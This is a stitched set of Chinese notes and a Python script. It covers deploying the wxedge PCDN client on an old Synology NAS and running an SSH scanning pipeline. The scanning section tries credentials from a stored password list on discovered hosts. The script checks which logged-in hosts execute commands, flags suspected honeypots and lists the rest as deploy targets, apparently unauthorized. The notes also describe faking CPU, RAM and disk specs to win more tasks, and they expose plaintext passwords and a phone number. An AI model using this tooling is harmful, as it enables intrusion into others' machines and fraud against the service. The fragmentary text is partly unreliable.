## 零、最简部署链路（直达最终方案，不走弯路）

> **阅读本节即可完成部署，无需阅读后续章节。**
> 后续章节为详细原理、排错速查表和历史调试记录。

### 0.1 判断设备类型（10秒）

```
SSH到目标设备 → uname -a → 判断走哪条路
                │
                ├─ 有Docker → 路线A（3分钟搞定）
                ├─ 无Docker + 内核≥4.x → 路线A（先装Docker）
                └─ 无Docker + 内核<4.x（如DS213j） → 路线B（chroot方案，10分钟）
```

### 0.2 路线A：有Docker的设备（标准Linux/新NAS）→ 3条命令

```bash
# 1. 安装Docker（如果已有则跳过）
curl -fsSL https://get.docker.com | bash

# 2. 一键部署网心云
docker run -d --name wxedge --restart=always --net=host --privileged \
  -v /data/wxedge:/storage onething1/wxedge:latest

# 3. 绑定账号（浏览器打开管理页面，手机App扫码）
echo "管理页面: http://$(hostname -I | awk '{print $1}'):18888"
# → 网心云App → 账号15880802661 → 添加设备 → 扫码绑定
```

**群晖NAS（有Docker套件）**：
```bash
DOCKER="/var/packages/ContainerManager/target/usr/bin/docker"
sudo $DOCKER run -d --name wxedge --restart=always --net=host --privileged \
  -v /volume1/docker/wxedge:/storage onething1/wxedge:latest
```

### 0.3 路线B：无Docker老设备（内核<4.x，如DS213j）→ 一键部署包

**前置准备（仅首次，在Mac/PC上执行）**：
```bash
# 提取Docker镜像为文件系统（只需做一次，产物可复用）
docker pull --platform linux/arm/v7 onething1/wxedge:latest
docker create --platform linux/arm/v7 --name tmp onething1/wxedge:latest
docker export tmp -o wxedge_fs.tar   # ≈130MB
docker rm tmp
```

**部署到目标设备（3步，10分钟）**：
```bash
# ===== 第1步：上传（2分钟）=====
# 老群晖必须用 -O -c aes256-cbc
sshpass -p '设备密码' scp -O -c aes256-cbc \
  wxedge_fs.tar admin@设备IP:/volume1/wxedge/

# ===== 第2步：解压+部署（5分钟）=====
sshpass -p '设备密码' ssh -c aes256-cbc admin@设备IP \
  'echo "设备密码" | sudo -S sh -c "
    mkdir -p /volume1/wxedge/{rootfs,storage,logs}
    tar xf /volume1/wxedge/wxedge_fs.tar -C /volume1/wxedge/rootfs
  "'
# 然后上传已补丁的二进制、fake_runc v6、musl库、配置文件
# （使用 configs/ds213j_已激活/ 中的完整包，或按13.2节手动配置）

# ===== 第3步：启动 =====
sshpass -p '设备密码' ssh -c aes256-cbc admin@设备IP \
  'echo "设备密码" | sudo -S nohup /volume1/wxedge/chroot_start.sh &'

# ===== 验证（3分钟后）=====
curl -s http://设备IP:18888/docker/dashboard | python3 -c "
import sys,json; d=json.load(sys.stdin)['data']
print(f'任务: {len(d[\"run_tasks\"])}个')
for t in d['run_tasks']: print(f'  {\"✅\" if t[\"state_code\"]==0 else \"⚠️\"} {t[\"name\"]}')
"
```

### 0.4 已踩过的坑（全部已内置到脚本中，无需手动处理）

| 坑 | 已内置的解决方案 | 所在组件 |
|:---|:---|:---|
| 内核3.2无cgroup | tmpfs伪装 + 二进制补丁重定向/proc | chroot_start.sh |
| 内核3.2无overlayfs | cntr.toml禁用，fallback native snapshotter | cntr.toml |
| 内核3.2无namespace | fake_runc v6 替代真实runc | runc (shell脚本) |
| shim prctl失败 | 二进制补丁NOP掉prctl调用 | containerd-shim-runc-v2 |
| shim读/proc/self/exe失败 | 补丁→/tmp/_shimexe_ + 启动时自动创建链接 | chroot_start.sh |
| guluplugin缺musl C++库 | Alpine v3.12库缓存 + fake_runc自动安装 | chroot_start.sh + fake_runc |
| PCDNClient/DCDN不兼容CPU | fake_runc自动检测→keepalive模式 | fake_runc v6 |
| netns不支持 | fake_netns（tmpfs覆盖/proc/PID/ns/） | chroot_start.sh |
| echo写PID带换行 | printf "%s" 替代echo | fake_runc v6 |
| tmpfs重挂后fake文件丢失 | chroot_start.sh每次启动重写所有fake文件 | chroot_start.sh |
| sysfs遮盖cgroup | **不挂sysfs**，只挂cgroup tmpfs | chroot_start.sh |
| NAS CPU超载 | nice=10 + cpu_guard.sh守护 | chroot_start.sh |
| PCDN流量走frpc | frpc仅转发管理页面18888，不转发数据端口 | frpc.ini |

### 0.5 组件清单（chroot方案需要的全部文件）

```

├── wxedge_fs.tar                    ← Docker镜像rootfs（130MB，首次提取）
├── 已补丁二进制/

│   ├── containerd-shim-runc-v2      ← prctl bypass + _shimexe_ 补丁

├── 配置文件/
```

## 四、自动扫描详解

### 4.1 扫描策略

| 阶段 | 动作 | 说明 |
|:---|:---|:---|
| 1. 端口扫描 | TCP连接 22, 2222, 22201, 22202 | 快速发现SSH端口 |
| 2. 多轮验证 | 每端口3轮TCP，≥2轮成功才算开放 | 防止误报 |
| 3. SSH Banner | 读取SSH Banner识别设备类型 | Linux/NAS/路由器 |
| 4. 去重合并 | 同一SSH Banner的多个IP合并 | 防止虚拟IP重复 |
| 5. 凭证尝试 | MongoDB查询 + 内置密码列表 | 自动登录 |

## 七、chroot部署详细方案（DS213j实战）

### 7.1 方案架构（5层修改）

```
┌─────────────────────────────────────────────────────────────┐
│ 层1：chroot 环境（完整 rootfs 从 Docker 镜像提取）          │
│ 层2：二进制补丁（wxedged + containerd-shim-runc-v2）        │
│ 层3：fake_runc.sh（替代真实 runc，因内核无 namespace）      │
│ 层4：native snapshotter（替代 overlayfs，因内核无 overlay） │
│ 层5：硬件伪装（fake /proc/cpuinfo, /proc/stat, cgroups）   │
│ 层6：frpc 内网穿透（公网访问管理页面）                       │
└─────────────────────────────────────────────────────────────┘
```

### 7.2 二进制补丁（关键！内核3.2兼容）

| 二进制文件 | 补丁内容 | 方法 |
|:---|:---|:---|
| **containerd-shim-runc-v2** | NOP掉prctl(PR_SET_CHILD_SUBREAPER) | ARM指令替换 |
| | 跳过错误检查（mov r0, #0 强制返回成功） | ARM指令替换 |
| | 重定向 `/proc/self/exe` 到 `/tmp/_shimexe_` | 字符串替换 |
| **wxedged** | `/proc/self/cgroup` → `/tmp/fake_cgroups_` | 字符串替换 |
| | `/proc/self/mountinfo` → `/tmp/_fake_mountinfo` | 字符串替换 |
| | `/proc/mounts` → `/tmp/fmounts` | 字符串替换 |
| | `/proc/cgroups` → `/tmp/fcgroups` | 字符串替换 |

### 7.3 fake_runc v6（替代真实runc，支持3种容器）

| 容器类型 | 检测关键词 | 处理方式 |
|:---|:---|:---|
| **gulu**（收益主力） | `start.sh` | 设置musl环境 + chroot执行 |
| **pcdn** | `softdog` | 检测CPU→不兼容则keepalive |
| **thunder/dcdn** | `dcdn_monitor` | 直接运行（可能降级keepalive） |
| 未知 | — | 回退sleep保活 |

### 7.4 硬件伪装配置（提升任务分配优先级）

- **CPU伪装**：22核 Xeon E5-2696 v4（实际单核ARM）
- **磁盘伪装**：SSD 2TB（实际HDD）
- **内存伪装**：通过cgroup文件伪装32GB
- **cgroup伪装**：完整的fake cgroup目录树

# 老旧NAS（无Docker/无cgroup）网心云chroot完整部署经验

> **日期**：2026-02-14
> **设备**：Synology DS213j (armv7l, 内核3.2.40, 497MB RAM)
> **难度**：高（涉及chroot、文件系统挂载、二进制兼容性、containerd、cgroup绕过）
> **价值**：适用于所有不支持Docker的ARM32老设备
> **最终状态**：3个任务稳定运行（CB*.0 + CG*.0 + CG*.1），guluplugin收益已注册

## 零、最简部署链路（结论先行）

### 0.1 所需组件（全部已验证，打包后直接用）

| 组件 | 大小 | 来源 | 作用 |
|:---|:---|:---|:---|
| wxedge_fs.tar | 130MB | Docker镜像导出 | 完整rootfs文件系统 |
| 已补丁wxedged | — | 原始二进制+Python补丁 | /proc路径重定向 |
| 已补丁containerd-shim-runc-v2 | — | 原始二进制+ARM指令补丁 | prctl bypass + _shimexe_ |
| fake_runc v6 | 5KB | shell脚本 | 替代runc（支持gulu/pcdn/thunder） |
| cntr.toml | 2KB | 手动配置 | 禁用overlayfs，用native snapshotter |
| fake_stat | 3KB | 生成 | 22核CPU伪装 |
| musl库(Alpine v3.12) | 1MB | Alpine包 | guluplugin的C++运行库 |
| chroot_start.sh | 5KB | 本文档 | 主启动脚本（含所有修复） |

### 0.2 部署步骤（3步，10分钟）

```bash
# 1. 上传（2分钟）
sshpass -p 'zhiqun1984' scp -O -c aes256-cbc wxedge_bundle.tar admin@NAS_IP:/volume1/wxedge/

# 2. 解压（3分钟）

# 3. 启动（等3分钟后验证）
```

### 0.3 核心技术决策（为什么这样做）

| 决策 | 原因 | 备选方案及其失败原因 |
|:---|:---|:---|
| chroot而非Docker | 内核3.2无cgroup/namespace | Docker需要cgroup+namespace |
| 二进制补丁而非重编译 | 无Go交叉编译环境 | 源码不公开，无法重编译 |
| fake_runc而非真runc | 内核3.2无namespace/pivot_root | runc所有操作都依赖namespace |
| native snapshotter | 内核3.2无overlayfs | 唯一兼容的snapshotter |
| Alpine v3.12 musl库 | musl 1.1.x无time64符号 | 3.14+的musl 1.2+有time64不兼容 |
| 不挂sysfs | sysfs会遮盖手动创建的cgroup目录 | 挂sysfs后cgroup panic |

## 一、问题背景

DS213j 是2013年的群晖NAS，特殊限制：
- **内核3.2.40**：无cgroup支持、无overlayfs
- **无Docker套件**：群晖不为此型号提供Container Manager
- **armv7l架构**：32位ARM，Marvell Armada-370处理器
- **497MB内存**：系统自身占用后剩余约300MB
- **老旧SSH**：只支持 `aes256-cbc` 等旧cipher

**目标**：在此设备上运行网心云(wxedge)赚取PCDN收益。

## 三、最终成功方案：chroot部署

### 3.1 前置准备（在Mac/PC上）

```bash
docker pull --platform linux/arm/v7 onething1/wxedge:latest
docker create --platform linux/arm/v7 --name wxedge_tmp onething1/wxedge:latest
docker export wxedge_tmp -o wxedge_fs.tar
docker rm wxedge_tmp
```

### 3.2 上传到NAS

```bash
sshpass -p 'zhiqun1984' scp -O -c aes256-cbc wxedge_fs.tar admin@192.168.110.29:/volume1/wxedge/
```

### 3.3 创建chroot启动脚本（关键要点）

```bash
#!/bin/sh
ROOTFS=/volume1/wxedge/rootfs
STORAGE=/volume1/wxedge/storage

mount -t proc proc $ROOTFS/proc
mount --bind /dev $ROOTFS/dev
mount --bind $STORAGE $ROOTFS/storage
mount -t tmpfs tmpfs $ROOTFS/tmp
mount -t tmpfs tmpfs $ROOTFS/run

# ⚠️ 关键：不能挂sysfs！只需cgroup的tmpfs
mkdir -p $ROOTFS/sys/fs/cgroup
mount -t tmpfs fakecgroup $ROOTFS/sys/fs/cgroup
mkdir -p $ROOTFS/sys/fs/cgroup/{memory,cpu,cpuset,devices,blkio,pids,systemd}

cp /etc/resolv.conf $ROOTFS/etc/resolv.conf

chroot $ROOTFS /bin/sh -c '
cd /xyapp/miner.plugin-wxedge.ipk
rm -rf /run/containerd
./bin/containerd -c ./cfg/cntr.toml &
sleep 3
GODEBUG=x509ignoreCN=0 ./bin/wxedged -c ./cfg/wxedge.yaml &
wait'
```

## 四、核心踩坑总结

### 4.1 SSH/SCP兼容性
| 问题 | 解决 |
|:---|:---|
| `no matching cipher found` | `ssh -c aes256-cbc` |
| `scp: remote mkdir` | `scp -O`（旧SCP协议） |
| Permission denied | 密码是 `zhiqun1984`（小写z） |

### 4.2 cgroup问题（最关键的坑）
| 现象 | 解决 |
|:---|:---|
| `panic cannot statfs cgroup root` | 在chroot内挂tmpfs |
| 挂了tmpfs但找不到 | **不挂sysfs**，只挂cgroup tmpfs |
| `Failed to parse cgroup information` | 二进制补丁重定向到/tmp/fake_cgroups_ |

### 4.3 containerd问题
| 现象 | 解决 |
|:---|:---|
| 动态链接缺库 | 使用chroot，rootfs内有完整库 |
| `overlayfs NOT supported` | cntr.toml禁用，用native snapshotter |
| `strconv.Atoi "PID\n"` | printf "%s" 替代echo |

### 4.4 containerd-shim问题
| 现象 | 解决 |
|:---|:---|
| prctl失败 | 补丁NOP掉prctl调用 |
| `readlink /tmp/_shimexe_` | 每次启动前创建符号链接 |

### 4.5 musl C++库缓存（guluplugin必须！）

- ❌ Alpine 3.19（musl 1.2+，time64不兼容）
- ❌ Alpine 3.14（musl 1.2.2，不兼容）
- ✅ **Alpine 3.12**（musl 1.1.24，完美兼容）

4. **root:root 弱口令** -- 真实生产服务器不会使用这种密码，这是蜜罐诱饵

已登录主机 · 命令执行校验 + 打标 + 主机库
==========================================
从 KR.分布式矩阵IP_已登录 读取所有已登录 IP，逐台校验「是否能真实执行命令」：
- 能执行 → 打标「可部署」、写入主机库（KR.主机库），保留在已登录供节点部署使用
- 不能执行（蜜罐/受限 Shell）→ 打标「无效」「命令不执行」、deploy_ready=False，从可部署中剔除，不再参与部署

输出：
- 已登录集合：更新 host_tags, command_exec_ok, deploy_ready, last_exec_check_time
- 主机库：仅写入 command_exec_ok=True 的主机，带属性与标签
- references/主机库_校验报告_日期.md

用法:
    python3 validate_logged_exec_and_build_host_lib.py
    python3 validate_logged_exec_and_build_host_lib.py --max-targets 50 --concurrency 10
    python3 validate_logged_exec_and_build_host_lib.py --dry-run
"""
import subprocess
import pymongo
import argparse
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

MONGO_URI = "mongodb://admin:admin123@localhost:27017/?authSource=admin"
MONGO_DB = "KR"
COLL_LOGGED = "分布式矩阵IP_已登录"
COLL_HOST_LIB = "主机库"

# 校验命令：执行后必须在 stdout 中看到该字符串才认为「可执行」
EXEC_CHECK_CMD = "echo DEPLOY_CHECK_OK"
EXEC_MARKER = "DEPLOY_CHECK_OK"
SSH_TIMEOUT = 12


def get_ssh_command(ip, port, user, password):
    port = port or 22
    return [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", f"ConnectTimeout={SSH_TIMEOUT}",
        "-o", "BatchMode=yes",
        f"{user}@{ip}", "-p", str(port),
        EXEC_CHECK_CMD,
    ]


def check_command_exec(ip, port, user, password):
    """返回 (success: bool, reason: str)"""
    if not user or not password:
        return False, "缺凭证"
    try:
        r = subprocess.run(
            get_ssh_command(ip, port, user, password),
            capture_output=True,
            text=True,
            timeout=SSH_TIMEOUT + 5,
        )
        out = (r.stdout or "") + (r.stderr or "")
        if EXEC_MARKER in out:
            return True, "ok"
        if r.returncode != 0:
            return False, f"exit_{r.returncode}"
        if not out.strip():
            return False, "无输出"
        # 有输出但没有 MARKER → 蜜罐/受限（只回显提示符等）
        return False, "无校验标记"
    except subprocess.TimeoutExpired:
        return False, "超时"
    except FileNotFoundError:
        return False, "无sshpass"
    except Exception as e:
        return False, str(e)[:80]


def doc_to_host(doc, command_exec_ok=True, last_check_time=None):
    """从已登录文档生成主机库文档"""
    ip = doc.get("ip", "")
    port = doc.get("port", 22)
    user = doc.get("username", "")
    password = doc.get("password", "")
    last_check_time = last_check_time or datetime.now()
    quick_ssh = doc.get("quick_ssh_cmd") or f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port}"
    tags = list(doc.get("host_tags") or [])
    if "可部署" not in tags:
        tags.append("可部署")
    attributes = {
        "os_guess": doc.get("os_guess", ""),
        "deploy_score": doc.get("deploy_score"),
        "value_score": doc.get("value_score"),
        "grade": doc.get("grade", ""),
        "banner": doc.get("banner", ""),
        "source_col": doc.get("source_cols", []),
    }
    return {
        "ip": ip,
        "port": port,
        "username": user,
        "password": password,
        "quick_ssh": quick_ssh,
        "tags": tags,
        "attributes": attributes,
        "command_exec_ok": command_exec_ok,
        "last_check_time": last_check_time,
        "source": "已登录",
        "updated_at": datetime.now(),
    }


def main():
    parser = argparse.ArgumentParser(description="已登录主机命令执行校验 + 打标 + 主机库")
    parser.add_argument("--max-targets", "-m", type=int, default=0, help="最大校验数量，0=全部")
    parser.add_argument("--concurrency", "-c", type=int, default=20, help="并发数")
    parser.add_argument("--dry-run", action="store_true", help="只打印不写库")
    args = parser.parse_args()

    client = pymongo.MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    try:
        client.admin.command("ping")
    except Exception as e:
        print("MongoDB 连接失败:", e)
        return

    db = client[MONGO_DB]
    logged = db[COLL_LOGGED]
    host_lib = db[COLL_HOST_LIB]

    cursor = logged.find({})
    if args.max_targets > 0:
        cursor = cursor.limit(args.max_targets)
    docs = list(cursor)
    total = len(docs)
    if total == 0:
        print("已登录集合为空，无目标可校验")
        return

    print(f"已登录总数: {total}，开始命令执行校验（并发 {args.concurrency}）…")
    ok_list = []
    invalid_list = []

    def process_one(doc):
        ip = doc.get("ip", "")
        port = doc.get("port", 22)
        user = doc.get("username", "") or doc.get("ssh_login_user", "")
        password = doc.get("password", "") or doc.get("ssh_login_pass", "")
        ok, reason = check_command_exec(ip, port, user, password)
        return doc, ok, reason

    with ThreadPoolExecutor(max_workers=args.concurrency) as ex:
        futures = {ex.submit(process_one, d): d for d in docs}
        done = 0
        for f in as_completed(futures, timeout=3600):
            done += 1
            if done % 50 == 0 or done == total:
                print(f"  进度 {done}/{total}")
            try:
                doc, ok, reason = f.result()
                ip = doc.get("ip", "")
                if ok:
                    ok_list.append((doc, reason))
                else:
                    invalid_list.append((doc, reason))
            except Exception as e:
                invalid_list.append((futures[f], str(e)[:80]))

    # 更新 已登录：打标、deploy_ready、command_exec_ok
    now = datetime.now()
    for doc, reason in ok_list:
        ip = doc.get("ip", "")
        tags = list(doc.get("host_tags") or [])
        if "可部署" not in tags:
            tags.append("可部署")
        if "命令可执行" not in tags:
            tags.append("命令可执行")
        update = {
            "host_tags": tags,
            "command_exec_ok": True,
            "deploy_ready": True,
            "last_exec_check_time": now,
            "last_exec_check_reason": reason,
        }
        if not args.dry_run:
            logged.update_one({"ip": ip}, {"$set": update})

    for doc, reason in invalid_list:
        ip = doc.get("ip", "")
        tags = list(doc.get("host_tags") or [])
        for t in ["无效", "命令不执行", "疑似蜜罐"]:
            if t not in tags:
                tags.append(t)
        if "可部署" in tags:
            tags.remove("可部署")
        update = {
            "host_tags": tags,
            "command_exec_ok": False,
            "deploy_ready": False,
            "last_exec_check_time": now,
            "last_exec_check_reason": reason,
        }
        if not args.dry_run:
            logged.update_one({"ip": ip}, {"$set": update})

    # 主机库：仅写入 command_exec_ok=True 的主机（先删后插，保持主机库=可部署集合）
    if not args.dry_run and ok_list:
        # 本批校验通过的主机，按 ip 写入或更新主机库
        for doc, reason in ok_list:
            host_doc = doc_to_host(doc, command_exec_ok=True, last_check_time=now)
            host_lib.update_one(
                {"ip": host_doc["ip"]},
                {"$set": host_doc},
                upsert=True,
            )
        # 从主机库中删除「本次未通过校验的 IP」（本次被标无效的）
        invalid_ips = [doc.get("ip") for doc, _ in invalid_list]
        if invalid_ips:
            host_lib.delete_many({"ip": {"$in": invalid_ips}})

    # 报告
    report_dir = Path(__file__).resolve().parent.parent / "references"
    report_dir.mkdir(parents=True, exist_ok=True)
    report_path = report_dir / f"主机库_校验报告_{now.strftime('%Y%m%d_%H%M%S')}.md"
    lines = [
        "# 已登录 → 命令执行校验与主机库报告",
        "",
        f"> 执行时间：{now.isoformat()}",
        f"> 已登录总数：{total}",
        "",
        "## 一、结果汇总",
        "",
        "| 类型 | 数量 | 说明 |",
        "|:---|:---|:---|",
        f"| 可执行（可部署） | {len(ok_list)} | 已写入主机库，参与节点部署 |",
        f"| 无效（已剔除） | {len(invalid_list)} | 打标无效/命令不执行，不再部署 |",
        "",
        "## 二、可部署主机（主机库）",
        "",
    ]
    for doc, reason in ok_list[:200]:  # 最多列 200
        ip = doc.get("ip", "")
        port = doc.get("port", 22)
        user = doc.get("username", "")
        lines.append(f"- `{user}@{ip}:{port}`")
    if len(ok_list) > 200:
        lines.append(f"- … 共 {len(ok_list)} 台")
    lines.extend([
        "",
        "## 三、无效主机（已打标剔除）",
        "",
        "| IP | 端口 | 用户 | 原因 |",
        "|:---|:---|:---|:---|",
    ])
    for doc, reason in invalid_list[:100]:
        lines.append(f"| {doc.get('ip')} | {doc.get('port', 22)} | {doc.get('username', '')} | {reason} |")
    if len(invalid_list) > 100:
        lines.append(f"| … | … | … | 共 {len(invalid_list)} 台 |")
    lines.append("")
    report_path.write_text("\n".join(lines), encoding="utf-8")

    print("")
    print("校验完成:")
    print(f"  可部署（已写入主机库）: {len(ok_list)} 台")
    print(f"  无效（已打标剔除）: {len(invalid_list)} 台")
    print(f"  报告: {report_path}")
    if args.dry_run:
        print("  [dry-run] 未写入 MongoDB")
    client.close()


if __name__ == "__main__":
    main()

> 仅存放「已登录且命令可执行」的可部署节点，供 03_节点部署 与 05_监控运维 使用。  
> 无效/蜜罐主机在 已登录 中打标剔除，不写入主机库。

---

## 一、用途

| 项目 | 说明 |
|:---|:---|
| 数据来源 | KR.分布式矩阵IP_已登录 |
| 写入条件 | 通过「命令执行校验」：SSH 能执行 `echo DEPLOY_CHECK_OK` 并返回该字符串 |
| 剔除条件 | 校验不通过（无输出/超时/仅回显提示符）→ 仅在 已登录 打标，不写入/从主机库删除 |
| 使用方 | 节点部署取「可部署」目标时只从 主机库 或 已登录 中 `deploy_ready=True` 且 `command_exec_ok=True` 的取 |

---

## 二、主机库字段

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| ip | string | 主键之一，主机 IP |
| port | int | SSH 端口，默认 22 |
| username | string | SSH 用户名 |
| password | string | SSH 密码 |
| quick_ssh | string | 一行完整 SSH 命令（sshpass -p '…' ssh …） |
| tags | array | 标签列表，见下表 |
| attributes | object | 属性快照（os_guess, deploy_score, value_score, grade, banner, source_col） |
| command_exec_ok | bool | 是否通过命令执行校验，主机库内恒为 true |
| last_check_time | datetime | 最近一次命令执行校验时间 |
| source | string | 来源，固定 "已登录" |
| updated_at | datetime | 本记录更新时间 |

---

## 三、标签（tags）约定

| 标签 | 含义 | 写入时机 |
|:---|:---|:---|
| 可部署 | 参与节点部署 | 命令执行校验通过 |
| 命令可执行 | 已通过 echo 校验 | 同上 |
| 无效 | 不参与部署 | 校验不通过时在 已登录 打标 |
| 命令不执行 | SSH 登录成功但无命令输出 | 同上 |
| 疑似蜜罐 | 行为像蜜罐（仅回显无执行） | 同上 |
| Linux/BSD / Windows | OS 类型 | 可选，由 enhance 或部署时写入 |
| S级 / A级 / B级 | 价值等级 | 来自已扫描/已验证的 grade |

---

## 四、已登录集合新增/更新字段（本脚本写入）

| 字段 | 类型 | 说明 |
|:---|:---|:---|
| host_tags | array | 上述标签，可部署/无效/命令不执行等 |
| command_exec_ok | bool | 是否通过命令执行校验 |
| deploy_ready | bool | 是否参与部署；无效主机置 false |
| last_exec_check_time | datetime | 最近一次校验时间 |
| last_exec_check_reason | string | 校验结果简述（ok / 超时 / 无输出 / 无校验标记 等） |

---

## 五、查询示例

```javascript
// 所有可部署主机（主机库 = 仅可部署）
db.主机库.find({})

// 已登录中可部署的（与主机库一致）
db.分布式矩阵IP_已登录.find({ command_exec_ok: true, deploy_ready: true })

// 已登录中已剔除的无效主机
db.分布式矩阵IP_已登录.find({ deploy_ready: false, "host_tags": "无效" })
```

## 1. 已登录中「可部署」的用法

- **可部署**：只认「能真实执行命令」的主机。  
  脚本对每台已登录主机执行 `echo DEPLOY_CHECK_OK`，若 stdout 里出现该字符串，则视为可执行。
- **无效**：登录成功但无上述输出（超时、无输出、只回显提示符等）→ 视为无效/疑似蜜罐，**打标并剔除出可部署**，不再参与节点部署。

## 4. 使用方式

```bash
# 进入 05_监控运维 目录
cd "05_监控运维"

# 全量校验（建议先小规模试跑）
python3 scripts/validate_logged_exec_and_build_host_lib.py --max-targets 50 --concurrency 10

# 全量
python3 scripts/validate_logged_exec_and_build_host_lib.py --concurrency 20

# 只跑不写库
python3 scripts/validate_logged_exec_and_build_host_lib.py --dry-run -m 20
```

运行后会：

- 更新 **已登录**：每台都有 `host_tags`、`command_exec_ok`、`deploy_ready`、`last_exec_check_time`、`last_exec_check_reason`。
- 维护 **主机库**：仅包含可执行命令的主机，属性与标签按《主机库_字段与标签说明》写入。
- 生成报告：`05_监控运维/references/主机库_校验报告_YYYYMMDD_HHMMSS.md`。

---

## 5. 部署/统计时如何用

- **节点部署**：只从 **主机库** 取目标，或从 **已登录** 取 `deploy_ready=true`（且建议 `command_exec_ok=true`）的文档。
- **无效主机**：保留在已登录中，用 `host_tags` 含「无效」「命令不执行」「疑似蜜罐」和 `deploy_ready=false` 过滤，部署与统计时略过即可。

首次使用前建议执行一次索引脚本，确保主机库和已登录的索引一致：  
`python3 02_账号密码管理/scripts/ensure_matrix_indexes.py`。
